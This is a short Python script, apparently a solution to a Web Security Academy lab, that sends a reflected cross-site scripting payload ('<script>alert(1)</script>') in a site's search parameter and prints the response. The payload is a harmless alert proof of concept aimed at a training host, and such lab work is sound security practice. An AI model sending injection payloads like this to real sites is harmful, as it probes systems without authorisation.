import requests
s = requests.Session()
site = 'ac811fb11fc3ea958008638b00400031.web-security-academy.net'

search_url = f'https://{site}/?search=<script>alert(1)</script>'
resp = s.get(search_url)

print(resp.text)